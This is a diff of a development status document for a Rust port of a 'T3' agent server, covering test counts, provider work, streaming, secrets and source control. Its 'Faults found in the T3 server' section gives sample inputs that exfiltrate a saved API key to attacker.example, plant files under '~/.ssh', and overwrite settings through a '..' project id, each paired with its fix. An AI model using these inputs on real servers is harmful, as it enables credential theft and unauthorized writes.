@@ -50,15 +50,15 @@ settings; about 140 MiB for the `claude` program alone).
 
 ## What exists
 
-`main` is in a working state. `tools/check.sh` passes 31 checks with `CONN_MONOREPO` set (Conn `b12470dcad`, 2026-11-14; 31 since the text generation check).
+`main` is in a working state. `tools/check.sh` passes 35 checks with `CONN_MONOREPO` set (Conn `b12470dcad`, 2026-11-14).
 
 | Part | State |
 | --- | --- |
-| RPC methods | 99 of 236 served; 99 have a run that the real client's decoders accept |
+| RPC methods | 102 of 236 served; 102 have a run that the real client's decoders accept |
 | Engine commands | 43 of 56 |
-| T3 testkit fixtures through this engine | 50 of 159 variants pass T3's own assertions (Claude 32 of 34, Codex 17 of 25, Grok 1 of 15; the other 85 are providers this server does not offer) |
-| HTTP routes | 13 of 57 |
-| `/mcp` tools | 28 of 87 |
+| T3 testkit fixtures through this engine | 69 of 159 variants pass T3's own assertions (Claude 34 of 34, Codex 25 of 25, Grok 10 of 15; the other 85 are providers this server does not offer) |
+| HTTP routes | 17 of 57 (the 4 of `/api/hooks/:hookId/:token`) |
+| `/mcp` tools | 33 of 87 |
 | Providers | Claude, Codex and Grok, of the 10 the T3 server has without Pi |
 
 Proven:
@@ -69,8 +69,9 @@ Proven:
   `JAVA_HOME`) and stdin as from the T3 server. 18 of the T3 server's 39 Claude transcripts pass (all that the
   driver runs). 11 live tests
   pass on Claude Haiku on macOS.
-- **Codex** runs on `codex app-server`, as in the T3 server. 37 scenarios show no difference,
-  20 of them the T3 server's own recordings. **No live Codex turn has run.**
+- **Codex** runs on `codex app-server`, as in the T3 server, subagents included. 40 scenarios
+  show no difference, 24 of them the T3 server's own recordings; two of them compare a thread
+  title through `codex exec`. **No live Codex turn has run.**
 - Orbit's container flow (start, add a project on the running server, a Swamp session, a
   thread through `/mcp`, wait, read, revoke, SIGTERM with no child left) passes on the fake
   provider and once with a live Haiku turn, on macOS.
@@ -136,6 +137,45 @@ Not proven:
 - Orbit's flow in a real container.
 - Codex on CLI 0.166 or 0.167 (the recordings are from 0.156).
 
+## Engine, part 3: buffered delivery (2026-11-14)
+
+The fixture replay passes 50 of 159 variants: Grok 9 of 15 (was 1), Claude 24 of 34 and Codex
+17 of 25 (unchanged).
+
+- **Buffered delivery, as T3** (`crates/conn-engine/src/streaming.rs`; T3's
+  `assistantStreaming.ts`, `RunExecutionService`, `TurnItemPositionStore`). A running assistant
+  node is never stored. A streaming assistant message or `assistant_message`/`reasoning` turn
+  item is stored at a Markdown boundary (cut there, at most every 400 ms) or whole after 800 ms
+  idle in `paragraph` mode, never in `turn` mode (`responseStreamingMode`, per project, read at
+  each turn start). What is stored stays: the turn end no longer deletes streaming rows, so the
+  log has no gaps. A held turn item reserves its position. Note: the brief said T3 "never
+  stores" streaming rows; that holds only in `turn` mode. In its default `paragraph` mode T3
+  stores each delivered snapshot, and so do we.
+- **What a subscriber sees now.** Live: streamed text arrives at paragraph boundaries, not every
+  100 ms; no running assistant node. Joining mid-turn: the last delivered snapshot (before: the
+  last 100 ms flush, which the turn end then deleted). Stored log: the delivered snapshots stay.
+- **Store version 3** drops the index of the old deletion and adds `turn_item_positions`. A
+  store from `main` opens and keeps its gaps (test with an old store).
+- **Idle at every turn end** (T3's `writeFinalRunEvents`): a provider terminal or a failed start
+  writes the provider thread `idle` or `error` whatever its status; cancels, Force stop,
+  deletes and restart recovery keep the old rule. **Refusals carry `detail`** equal to the
+  reason, as T3's `ws.ts`.
+- **Proofs.** T3's 13 `assistantStreaming.test.ts` cases and its fence and heading cases,
+  ported; engine tests for positions, the old store, the idle write (fails on the old rule)
+  and refusal bodies; the fixture replay (8 Grok variants moved out of `expected-failures.txt`;
+  `queued_turn/grok` now fails only on the message-order tie, as `queued_turn/codex`).
+- **Memory** (macOS, release, `memory_load`, 3 runs each). A long streamed turn (400
+  snapshots, about 40 KB, one view open): peak live heap 588 to 629 KiB, against 662 to 689
+  KiB on `main`. 1,000 ordinary turns: heap at the end 415 KiB (414 on `main`), peak 24.5 MiB
+  (24.3, the snapshot per reopened view). The new state is bounded: at most 64 open messages
+  per session, each with its delivered text, its latest text and one held snapshot.
+- **Not built from that brief**, in order: merge-back and the portable fork path (T3 delivers
+  the handoff through Codex `thread/inject_items` and Claude's `inlineContextLength`, both
+  provider-crate changes that other workers own); prepared runs and setup scripts; a workspace
+  strategy for delegated tasks; the other refused commands; bounded snapshots and the
+  `/history`, `/bounded`, `/transcript` routes; NFC and T3's search ranking (`paletteSearch.ts`,
+  about 1,300 lines). Commands stay 43 of 56.
+
 ## ACP provider, part 3 (2026-11-14)
 
 - **`/compact` for Grok, as T3 serves it** (`supportsCompaction`): the native slash prompt,
@@ -194,11 +234,38 @@ that list.
 `schedule_task`, `list_scheduled_tasks`, `delete_scheduled_task`, `run_scheduled_task_now`
 (`crates/conn-features`). One timer sleeps until the next run; no poll. Proven by 31 ported
 unit tests on a paused clock, the real client's decoders, and `parity.mjs` (no differences).
-`runNow` stops with its caller and records a failure, as T3 (2026-11-14). Not built: webhook
-tasks (refused on save; `crates/conn-features/README.md` maps what is left). `fresh_session` tasks are served since part 2 of the engine work (below). Annotations
+`runNow` stops with its caller and records a failure, as T3 (2026-11-14). Webhook tasks are
+served since 2026-11-14 (see above), without coalescing windows and the relay. `fresh_session` tasks are served since part 2 of the engine work (below). Annotations
 (`annotations.*` and the four `annotations_*` tools) on the T3 server's own files, also with
 parity. `docs/conn-only-areas.md`
 maps the Conn-only areas and what each needs.
+
+## Settings secrets, webhook tasks, text generator headers (2026-11-14)
+
+- **Settings secrets in the T3 server's store.** `settings.json` now holds `••••••` where a
+  secret is saved; the value is in `<state>/secrets/<name>.bin` under the T3 server's names
+  (folder 0700, files 0600). An inline field secret moves there at start, as in T3; saves
+  write, keep and remove store entries as `persistSettingsSecrets`, and undo them when the
+  file cannot be written. The server's own code (`SettingsStore::raw`) reads the values, so
+  text generators and source control host tokens work with a folder the T3 server wrote (a
+  marker without a file reads as no token, so `GH_TOKEN` is tried). Proof: unit tests on
+  T3's names, `settings-diff.mjs` (stored file in T3's form, 18 cases), and a new check,
+  `secrets-interop.mjs`: the T3 server's own settings service and this server on shared
+  folders, 5 cases (a folder from before the change, saves by either server, a key used by a
+  text generator request).
+- **Webhook scheduled tasks.** `rotateWebhookToken`, `listWebhookDeliveries`,
+  `getWebhookDelivery`, webhook saves and `/api/hooks/<task id>/<token>` are served
+  (`crates/conn-features/README.md`, "Webhook tasks"). Proof: 16 ported service tests, the
+  store's tests, 29 ported tests of the template, filter and signature code, a new check
+  `webhook-diff.mjs` (T3's own functions, 140 cases, no difference), and `effect-client.mjs`
+  (the 3 methods decode; HEAD, a body over 1 MiB, chunked or not, a wrong token and bad
+  paths are refused as T3 refuses them). Not built: coalescing windows (a save with
+  `coalesceKey` is refused), the T3 Connect relay, `secretRef`, managed policy.
+- **Text generator requests** carry the headers Node's fetch adds (`accept`,
+  `accept-language`, `sec-fetch-mode`, `user-agent: node`, `accept-encoding: gzip, deflate`,
+  `connection: keep-alive`); gzip and deflate answers decode within 8 MiB. `textgen-diff.mjs`
+  now compares every header but `host` and `content-length`, with compressed answers.
+  Assistant quotes in a title context become their text (`assistantCitationsToPlainText`).
 
 ## Text generators and thread titles (2026-11-14)
 
@@ -208,8 +275,7 @@ a generator was already served by `server.updateSettings` (3 more `settings-diff
 Thread titles are generated through a text generator: T3's prompt (generated from
 `buildThreadTitlePrompt`), its reply rules, three tries for a first title. When the title model
 is an agent provider (Codex by default, or Claude), the T3 server asks that provider; this
-server does not call it, and the thread keeps its seed title. The key stays in `settings.json`
-with the other settings secrets, or in the T3 server's secret store when a T3 server moved it.
+server does not call it, and the thread keeps its seed title. The key is in the T3 server's secret store, with the other settings secrets.
 Proven by 23 unit tests on a loopback stub, the client's decoders, and `textgen-diff.mjs`
 (a new check: T3's own code and ours against one stub, 102 comparisons). Map, what is sent and
 when, and the differences: `docs/server-area.md`, "Text generators". Commit messages, pull
@@ -387,10 +453,10 @@ The fixture replay now passes 35 of 159 variants: Codex 17 of 25 (was 16), Claud
   caller that drives a session directly (the crate's tests and tools). Not removed: another
   worker is in that crate.
 - **Rollback retries.** Up to 5 attempts, 100 ms after the first failure and doubling (at most
-  30 s); only the last failure sets `rollbackFailure` (T3's `EffectWorker`). As in T3, a
-  failure after the provider rolled back (in the file restore) retries the provider rollback
-  too. Proof: `a_rollback_that_fails_twice_then_works_is_retried`; the failing test now
-  expects 5 tries.
+  30 s); only the last failure sets `rollbackFailure` (T3's `EffectWorker`). A failure after
+  the provider rolled back (in the file restore) retries only that step since the review
+  fixes ("Engine review fixes"); T3 retries the provider rollback too ("Faults found in the
+  T3 server"). Proof: `a_rollback_that_fails_twice_then_works_is_retried`.
 - **MCP elicitations for Codex** (`CodexMcpElicitation.ts`). A form elicitation is an
   approval with the app name and the persistence choices; the answer is the form's option,
   with `_meta.persist`. A URL elicitation, a form an approval cannot fill, or one without an
@@ -510,6 +576,42 @@ flow calls when the title model is an agent provider; Claude runs the CLI as abo
 own CLI call; one stub comparison per provider of argv, environment and stdin. The schema
 string must come from T3 (a generator), since the CLI gets it verbatim.
 
+## Source control, part 4 (2026-11-14)
+
+The three foundations the pull request steps rest on are built and proven; on them, the
+engine's pull request links and five `/mcp` tools. No RPC method was added.
+
+- **The host definition registry** (`conn-source-control/src/registry/`): remote recognition in
+  T3's recognition order, change request URLs in claim order and per host, canonical repository
+  keys, the selector, the project predicates, GitCafe's URL spelling, the thread link keys.
+  `registry-diff.mjs` (new check) runs T3's own registry and ours on every literal of T3's
+  definition tests and a fixed grid: 24,085 cases, 0 differences.
+- **Provider detection** (`detect.rs`, `cache.rs`): the checkout's remotes, the recognised
+  context, unknown servers refined through GitHub, GitLab and Forgejo CLIs one after another,
+  with T3's two caches (bounded, one shared lookup per key). T3's registry test cases pass on
+  scratch repositories with stub CLIs. Nothing calls it yet.
+- **GitHub's GraphQL operations, generated** (`gen-graphql.mjs`, new `--check`): 55 operations
+  printed by `effect/graphql` from T3's modules, and a batch renderer held to Effect's.
+- **Engine: `thread.pull-request.link` and `unlink` as T3's decider** (`pull_requests.rs`):
+  canonical keys, a Forgejo port from the URL, GitCafe's spelling, the branch pull request kept
+  beside a first manual link, a stack member unlinked to a tombstone that a manual link lifts,
+  `thread.pull-request-synced` always (it was `thread.metadata-updated`, and nothing on a
+  no-op). Proven through `client-check.mjs` (13 checks).
+- **`/mcp`: 33 of 87 tools** (was 28): `link_pull_request(s)`, `unlink_pull_request(s)`,
+  `list_thread_pull_requests`; 26 parity steps, values compared, no differences. The argument
+  check now decodes array elements and `minItems` in Effect's words.
+- New dependency: `url` 2.5 (WHATWG, ICU IDNA): +201,280 bytes on the macOS release binary
+  alone. With all of part 4 the binary grew from 16,800,544 to 17,093,088 bytes (+292,544).
+- `tools/check.sh` with `CONN_MONOREPO`: all 33 checks pass, none skipped (`check exit: 0`);
+  the fixture replay is unchanged at 42 of 159.
+
+Not built, and why: `git.*`, `pr` in VCS status and `pullRequests.*` need a fourth foundation,
+the project's `repositoryIdentity` (T3's `RepositoryIdentityResolver`; this engine's project
+rows carry none), then GitHub's request policy and each host's change request reads; a method
+is registered only when it serves all seven hosts. The fj login check and `cafe` token still
+last one operation (T3: 30 s and 5 minutes), and host calls still have no rate-limit slots or
+quota. Map: `crates/conn-source-control/README.md`, "What the next steps need".
+
 ## Claude provider: what the fixture replay showed (2026-11-14)
 
 Claude passes 24 of T3's 34 fixture variants through this engine, up from 17. Each fix has a
@@ -554,6 +656,215 @@ Memory: the T3 transcript replay (18 scenarios, release) peaked at 4.11–4.16 M
 `main` and 3.94–4.28 MiB on the branch (3 runs each); the new state is bounded (64 roster
 tasks, 64 links, 8 tails per turn, 16 ledger models).
 
+## Codex: subagents, the replay gate, message order and titles (2026-11-14)
+
+The fixture replay passes 51 of 159 variants (was 42): Codex 25 of 25 (was 17), Claude 25 of
+34 (was 24), Grok 1 of 15 (unchanged). Codex conformance: 0 open differences in 40 scenarios
+(was 37). `tools/check.sh`: 31 passed, nothing skipped.
+
+- **Codex subagents** (`crates/conn-provider-codex/src/mapper/subagents.rs`), as
+  `CodexAdapterV2` maps `collabAgentToolCall`, `subAgentActivity` and child threads. Proof: the
+  six subagent recordings replay event for event equal to T3's adapter (115, 87, 36, 50, 103
+  and 77 events, the crate's replay test); all six fixture variants pass. What Codex receives
+  changed in three places, each compared with T3: a child with no reported model gets
+  `thread/read`, then `thread/resume` (conformance compares them as a set: both servers send
+  them from a background task, and T3's test kit answers them, so recordings never hold
+  them); Stop sends `turn/interrupt` to the root, then each running child turn (new scenario
+  `subagentStop`, cut from T3's `subagent_v2` recording); a child of a stopped turn gets
+  `turn/interrupt`. The client routes a child thread to the session whose frame names it.
+  Bounds: 64 subagents per session, 16 child threads with early turns, 64 stopped turns.
+- **Engine changes (small, local; the engine worker owns `runner.rs` and the store):**
+  `translate` writes `provider_thread.updated` to its `appThreadId` and
+  `provider_turn.updated`/`runtime_request.updated` to the event's `threadId`, as T3's
+  `ProviderEventIngestor` (a child's turn no longer becomes the run's provider turn); the
+  projection read lists the provider threads a thread's subagents name, and orders messages
+  as T3's `sortMessagesByTurnItemOrder`; `runtime-request.respond` ends the request's node and
+  turn item and records `questionAnswer`, as T3's `Orchestrator`. No schema change: rows from
+  `main` load as before.
+- **The replay gate** (T3's `makeProviderReplayGate`) in the stub `codex` and the fake SDK host,
+  through files in the scenario folder; `queued_cancelled_while_active/codex` passes. The two
+  Claude variants now pass the gate and fail on Claude background wakes (not built). The ACP
+  stub has none: its four Grok variants also need `finish_held_run` and Grok background tasks.
+- **`queued_turn`.** The cause was never the clock: T3 stores the same `createdAt` stamps
+  (dumped from T3's own run) but lists messages by the ordinal of the turn item that shows
+  them. With that order the Codex and Claude variants pass; Grok's fails on the buffered
+  delivery.
+- **Thread titles through Codex.** `Provider::generate_text` (new, additive, default
+  `Unsupported`) takes the operation, folder, prompt, T3's output schema text, the selection,
+  image paths and a deadline, and returns one JSON object. Codex runs it as
+  `CodexTextGeneration.ts`: `codex mcp list --json` (10 s), then `codex exec` (180 s) with T3's
+  argv, the prompt on stdin, schema and output files named as T3 names them. The title code
+  asks the instance when the title model is not a text generator. Proof: conformance
+  `titleListed` and `titleFallback` run T3's own `generateThreadTitle` and ours on the stub:
+  argv, environment, folder, stdin bytes, schema file and answer are equal; the schema text is
+  generated from the monorepo (`TITLE_OUTPUT_SCHEMA`). Claude still keeps the seed title until
+  its provider implements `generate_text`. Not built: T3's fallback to another provider when
+  the chosen one is unusable; its managed runtime and custom models in the model choice.
+- **The provider thread's `error` status:** nothing to report. T3's Codex adapter ends every
+  turn `reusable`, a crash included; a test now holds that.
+
+Not ported on purpose: the subagent wake (T3 asks for a continuation turn when a child ends
+after its parent's turn; this server has no such wake for Codex, as for background commands).
+
+Memory (macOS, `memory_load` 1,000 fake turns, release, run beside `main`): live heap 415 KiB at
+turn 1,000 and 346 KiB after close (`main`: 414 and 346); RSS at the end 60.8 MiB (`main`
+57.8; allocator pages). The new provider state is bounded as listed above; the mapper's
+bound test runs 300 turns with a subagent each.
+
+## Review fixes: source control and text generation (2026-11-14)
+
+A review and a checker's verdict (`/tmp/conn-reviews/source-control-textgen-verdict.md`) gave
+these fixes, one commit each, each with a test that fails without it:
+
+- The saved text generator key fills the redaction marker only for a caller with
+  `providers:manage` (handler test, both callers).
+- `sourceControl.cloneRepository` needs `filesystem:write` as well (`STRICTER` in
+  `scopes.rs`; test, both callers).
+- `main` reads the login shell's `PATH` before it detects Codex; the server prints
+  `providers: …` at start (`tests/login_path.rs`: the binary, a stand-in login shell, a stub
+  `codex` only on that shell's `PATH`).
+- A text generator base URL that resolves to a link-local address is refused on the dialled
+  address (`LinkLocal::Refuse` in `conn_source_control::http`).
+- Concurrent login-shell refreshes coalesce (`LoginRefresh`); `claim_refresh` is gone.
+- `server.listTextGeneratorModels` is checked at decode (`LIMITED_METHODS`; 6 new limit cases).
+- `followed-files.txt` follows the text generation and login environment sources.
+- `http`: a fragment after a bare host, a query-only `Location`.
+- Stub logs quote the log path and ambiguous arguments.
+
+Left to another worker: host tokens that the T3 server moved to its secret store (finding 3).
+
+## Engine review fixes (2026-11-14)
+
+The confirmed findings of the engine and provider review, fixed on 2026-11-14.
+
+Deliberate differences from the T3 server:
+
+- **A rollback sends the provider rollback once per request.** A retry repeats only the step
+  that failed (file restore, stale refs, the commit). The live session moves to the
+  rolled-back provider thread only after the commit. T3 sends the provider rollback again on
+  every retry, which cuts a Codex thread again each time (see "Faults found in the T3
+  server"). In that failure path Codex gets fewer `thread/rollback` requests from us than from
+  T3. Nick decided this on 2026-11-14. Proof: `a_failing_restore_rolls_the_provider_back_once`,
+  `a_failed_restore_leaves_the_live_session_on_its_thread`.
+- **A rollback a crash interrupts after the provider rollback was sent fails on restart.** The
+  store keeps each admitted rollback until it commits or fails (`pending_rollbacks`, with its
+  phase), as T3 keeps `provider-thread.rollback` in its effect outbox. On open, a rollback that
+  had not reached the provider runs again, and one whose provider answer was kept goes on from
+  the file restore; both end as in T3, which requeues the effect. A rollback that stopped
+  between sending the provider rollback and keeping its answer is recorded as failed, with a
+  message that says the provider may already have rolled back. T3 runs it again from the
+  provider rollback, which can cut a Codex thread twice. Proof:
+  `a_restart_finishes_or_fails_a_rollback_left_pending` (fails without the recovery).
+
+Fixed to match the T3 server, each with a test that fails without the fix:
+
+- A start that fails after Force stop no longer holds the queue: `end_run` holds it only when
+  it ended the run (`a_late_start_failure_after_force_stop_does_not_hold_the_queue`).
+- The end-of-run checkpoint capture is an effect in the thread's lane, as T3's
+  `checkpoint.capture`, so a rollback admitted while a run waits rolls it back too
+  (`a_rollback_admitted_while_a_run_waits_for_its_capture_rolls_it_back`). Fixture replay: 42
+  of 159, as before.
+- `dispatch` and `end_run` take an effect's lane slot under the store lock, so lane order is
+  commit order (`lane_order_is_reservation_order`).
+- Rollback admission asks the provider instance for its capabilities, as T3's
+  `dispatchCheckpointRollback` (`rollback_asks_the_provider_instance_whether_it_can_roll_back`).
+- A rollback's own session gets the runtime policy override
+  (`a_rollback_session_gets_the_runtime_policy_override`); a dropped session-file call frees
+  its SDK host hold (`a_dropped_function_call_releases_its_hold`); the Codex `PATH` search
+  skips a file without an execute bit (`find_executable_skips_a_file_that_cannot_run`).
+
+Established, not fixed:
+
+- **Stop during a Claude cold start.** In T3 the run is marked `running` before
+  `session.startTurn` (`ProviderTurnStartService.ts` 1472-1475, start at 1652). When the
+  session has MCP servers, `openQuery` waits for `initializationResult` (up to 5 min) and
+  `setMcpServers` (up to 90 s) before it returns (`ClaudeAdapterV2.ts` 1470-1509, called at
+  12574), and the provider turn is emitted only after that (12701). A Stop in that window
+  finds no provider turn, so `dispatchRunInterrupt` takes its "before provider start" branch
+  (`Orchestrator.ts` 13013-13161): the run, attempt and root node end `interrupted` in the
+  Stop's own commit, with a `run_interrupt_result` "Run interrupted before provider start",
+  and `provider-turn.start` is cancelled (`cancelUnsettled`, `EventSink.ts` 783-794). The
+  worker races the running start against that cancellation (`EffectWorker.ts` 816 and 844),
+  so the start is interrupted and the half-open CLI is killed (`ClaudeAdapterV2.ts` 1530-1550).
+  A T3 client sees the run stop at once. Here, Stop records the request and queues an
+  `Interrupt` effect behind the `StartTurn` in the lane; the Claude provider's `start_turn`
+  also holds `turn_control` for the whole start (`conn-provider-claude/src/session.rs` 1392,
+  `interrupt_turn` waits on it at 1461). The client shows "Stopping" until the start returns,
+  up to about 6.5 minutes, and only then is the turn interrupted. Our Claude provider also
+  opens the provider turn before the boot (the cold-start change above), so a port of T3's
+  branch needs to know whether the provider accepted the turn, not only whether a provider
+  turn row exists. Without MCP servers T3 emits the provider turn right after `query()`, and
+  both servers take the normal interrupt path.
+- **`binaryPath` for Claude and Codex is not applied.** `crates/conn-server/src/main.rs`
+  builds `ClaudeConfig` and `CodexConfig` with their defaults (`claude`, `codex` on `PATH`) and
+  never reads `providerInstances.claudeAgent` or `.codex` from the settings; nothing applies a
+  later change either. The same holds for `homePath`, `launchArgs` and the instance
+  environment. T3 passes `binaryPath` (with `~` expanded) as `pathToClaudeCodeExecutable`
+  (`ClaudeAdapterV2.ts` 13884-13890 and 2145) and as the Codex command
+  (`CodexAdapterV2.ts` 1733). Only Grok follows its settings (`GrokSettings`, the server's
+  status task). This is an open parity gap: the fix needs the settings applied to the
+  provider configs at start and on change, as for Grok, with a conformance scenario that shows
+  the CLI each server starts.
+
+## Faults found in the T3 server
+
+Faults that the T3 server has and this server fixes on purpose. Each is to be written up for
+T3 Code.
+
+- **The redaction marker sends the saved text generator key to the caller's host.**
+  `apps/server/src/textGeneration/TextGenerators.ts:133-138`: when
+  `server.listTextGeneratorModels` gets a `config` whose `apiKey` is the marker, the saved key
+  replaces it, whatever `baseUrl` the config names. The method needs only `settings:write`
+  (`packages/contracts/src/clientRpcPermissions.ts:37`); changing text generators needs
+  `providers:manage`. Input: a client paired with `settings:write` alone sends
+  `{"id":"<saved id>","config":{"kind":"openaiCompatible","baseUrl":"https://attacker.example/v1","apiKey":"••••••"}}`.
+  Effect: the server sends `Authorization: Bearer <saved key>` (or `x-api-key` for Anthropic)
+  to that host, silently; `test: true` also sends a POST. T3's own test
+  (`TextGenerators.test.ts:165-188`) expects the key at a new host. Our fix: the handler fills
+  the saved key in only when the caller also holds `providers:manage`; otherwise it sends no
+  key (`crates/conn-server/src/methods/text_generation.rs`). The owner's edit form keeps
+  working, also after a changed host.
+- **A clone writes to any path with `source-control:write` alone.**
+  `apps/server/src/sourceControl/SourceControlRepositoryService.ts:241-286`
+  (`normalizeDestinationPath`, `prepareDestination`) accept any absolute or `~` path, create
+  the missing parents, and clone into a missing or empty folder. The method needs only
+  `source-control:write` (`clientRpcPermissions.ts:53`). Input: `sourceControl.cloneRepository`
+  with a repository the caller controls and `destinationPath: "~/.ssh"` on a host without
+  `~/.ssh`. Effect: a folder of the caller's content (such as `authorized_keys`) at that path, a
+  filesystem write outside the scope (traced in the code, not run). Our fix: the method needs
+  `source-control:write` and `filesystem:write` (`STRICTER` in
+  `crates/conn-server/src/scopes.rs`).
+- **A project id of `..` puts the annotation folder at the state folder.** In
+  `apps/server/src/annotations/AnnotationStore.ts:141`, `directoryFor` keeps dots, so
+  `annotations/..` is the state folder, and `ProjectId` takes any non-empty text. Input: a client
+  with `orchestration:operate` and `preview:operate` creates a project with id `..`, then calls
+  `annotations.create` with id `settings`. Effect in the T3 server: `<userdata>/settings.json`
+  is replaced by the annotation JSON, and `annotations.remove` deletes it; the same holds for
+  `keybindings.json` and any other `<id>.json` or `<id>.png|jpg|webp` there. Auth lives in
+  `statev2.sqlite`, which no annotation name reaches. Here the same call could also replace or
+  delete `auth.json`. Our fix: a folder name made only of dots is escaped (each `.` becomes
+  `%2E`), the folder must be one child of the annotations root, the per-project lock is keyed
+  by the folder name, and `project.create` refuses `.` and `..`.
+- **A rollback retry rolls a Codex thread back again.** (Paths in this entry are under
+  `apps/server/src/orchestration-v2/`.) `CheckpointRollbackService.ts`
+  `execute` (lines 335-346) calls `session.rollbackThread` first, then
+  `checkpoints.restore` and `checkpoints.deleteStaleRefs`, and only then writes the result.
+  When the restore or the ref delete fails (for example, `.git/index.lock` is held), the
+  effect fails and `EffectWorker.ts` (lines 842-886) runs the whole effect again, up to 5
+  attempts. Each attempt reads the same durable rows, and `CodexAdapterV2.ts`
+  `rollbackThread` (line 8526, with `resolveCodexRollbackTurnCount` at line 1102) counts the
+  turns to revert from those rows. Each attempt therefore asks Codex to revert the same number
+  of turns on a native thread that is already shorter. Example: three turns, roll back to turn
+  1, the index is locked. Codex is asked five times to drop 2 turns, so turn 1 and then the
+  whole conversation are dropped. The app still shows turn 1 and the later runs as completed
+  and records `rollbackFailure`. The next turn continues a Codex conversation that no longer
+  holds what the user sees. The Claude adapter's rollback only builds a row, so Claude is not
+  hurt. A crash after the provider rollback has the same effect once: `EffectOutbox.ts`
+  requeues `provider-thread.rollback` after a process loss
+  (`REPLAY_SAFE_EFFECT_TYPES_AFTER_PROCESS_LOSS`, line 135), and the effect starts again from
+  the provider rollback.
+
+
 ## What is left, in the planned order
 
 1. **Rust hygiene, step 1: done (2026-11-14).** The toolchain is pinned to 1.99.1; BeautifulRust's
@@ -590,28 +901,30 @@ tasks, 64 links, 8 tails per turn, 16 ledger models).
    terminal host (`ProviderHost`; in T3 only Antigravity's files and the registry's terminals
    use it). Cursor, OpenCode and Muse go in the SDK host as driver modules.
 4. **Replay of the T3 server's `testkit` fixtures: done (2026-11-14), Claude, Codex and Grok.**
-   See "Engine, part 2", "Codex: the turn start, …" and "ACP provider, part 3". Next: T3's
-   buffered delivery in the engine (9 Grok variants), Codex subagents (6), a replay gate in the
-   stand-ins (3 + 4 Grok variants), the `queued_turn` tie (2; a provider clock seam is not
-   enough).
+   See "Engine, part 2", "Codex: the turn start, …", "ACP provider, part 3", "Codex:
+   subagents, …" and "Engine, part 3". Codex passes all 25; buffered delivery is done. Next:
+   the replay gate in the ACP stub with `finish_held_run` (4 Grok variants, which also need
+   Grok background tasks), Grok subagents, Claude's background wakes.
 5. **Engine.** Merge-back and the portable fork path (both need T3's `ContextHandoffService`);
    prepared runs and setup scripts in a `setup-<id>` terminal; bounded thread snapshots and the `/history`, `/bounded` and
    `/transcript` routes (a full snapshot of a long thread peaks at about 13 bytes per byte of
    JSON); a workspace strategy for delegated tasks; search details (no NFC normalization, the
-   old snippet rule); titles only through a text generator (an agent title model keeps the seed
-   title; no fork source or linked pull request context in the prompt). `freshContext` is
+   old snippet rule); titles through a text generator or Codex (Claude as the title model keeps
+   the seed title until the Claude provider implements `generate_text`; no fork source or
+   linked pull request context in the prompt; no fallback to another provider). `freshContext` is
    served. A Claude turn shows as running at once since 2026-11-14.
 6. **Features.** Pull requests and source control: `crates/conn-source-control/README.md` maps
    the area (48 methods, 7 engine commands, 9 `/mcp` tools, 7 hosts). Served (2026-11-14):
    `server.discoverSourceControl` for all 7 hosts, and all 9 `sourceControl.*` (sign-in as a
    T3 server without an app client id; GitHub stars; `lookupRepository`, `cloneRepository`,
-   `publishRepository` on all 7 hosts). Next: the definition registry, provider detection and
-   a generator for GitHub's GraphQL documents, then `git.*` (each host's change request
-   reads and checkout first), `pr` in VCS status, `pullRequests.*` (35), the linked pull
-   request commands and the `/mcp` tools.
+   `publishRepository` on all 7 hosts). Built since (part 4): the definition registry,
+   provider detection, GitHub's GraphQL operations generated, the engine's link and unlink as
+   T3's, 5 of the 9 `/mcp` tools. Next: the project's `repositoryIdentity`, GitHub's request
+   policy, each host's change request reads and checkout, then `git.*`, `pr` in VCS status,
+   `pullRequests.*` (35), the other 5 linked pull request commands and 4 `/mcp` tools.
    Also: the Conn-only methods
    (annotations, panels, scheduled tasks, peer links, test logins, credentials, secrets, guest
-   share); 67 more `/mcp` tools (11 need nothing new: `crates/conn-mcp/README.md`, "All 87 tools"); Codex subagents; worktree setup scripts
+   share); 67 more `/mcp` tools (11 need nothing new: `crates/conn-mcp/README.md`, "All 87 tools"); Codex subagent wakes and stop; worktree setup scripts
    the T3 way (typed into a thread terminal, with a completion marker).
 7. **Small leftovers.** Done on 2026-11-14 (`docs/server-area.md`, end): the contract's
    limits on terminal environment variables and `assets.createUrl` strings (generated,
@@ -663,10 +976,11 @@ The check is the one to trust; several review findings did not hold.
 
 ## Branches
 
+
 - `t3/32cd278b` (text generators, titles, `runNow`, the redacting `Debug`): all 31 checks pass
   on macOS (2026-11-14). No new dependency; the release binary grew by 93,648 bytes
   (16,558,944 to 16,652,592, macOS arm64).
-- `main`: verified. All 31 checks pass on macOS (2026-11-14, with the ACP provider, scheduled
+- `main`: verified. All 35 checks pass on macOS (2026-11-14, with the ACP provider, scheduled
   tasks and annotations). The last Linux pass (all tests, 20 runs on the gnu target and 5 on
   musl, 2026-11-14) is older than those merges.
 - Fixed on 2026-11-14: the T3 adapter closes the Claude query after an interrupt, and the next
